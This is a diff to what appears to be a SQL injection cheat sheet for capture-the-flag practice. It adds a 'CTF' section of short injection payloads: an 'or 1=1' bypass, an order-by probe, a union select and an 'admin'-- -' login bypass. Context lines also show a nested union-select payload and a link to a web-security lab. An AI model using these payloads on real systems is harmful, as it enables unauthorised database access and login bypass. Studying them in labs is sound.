@@ -29,6 +29,7 @@
 25. [Exceptional Payloads](#exceptional-payloads)
 26. [XML based filter bypass via XML encoding](#XML-based-filter-bypass-via-XML-encoding)
 27. [Wordlist](#wordlist)
+28. [CTF](#ctf)
 ___
 
 ### External Links for SQLi Techniques
@@ -374,3 +375,11 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
 ## XML based filter bypass via XML encoding
 
 **Portswigger Academy Lab:** [Click](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
+
+### CTF
+```
+'or 1=1-- -
+' order by 1-- -
+' union select 1,2,3,4-- -
+admin'-- -
+```
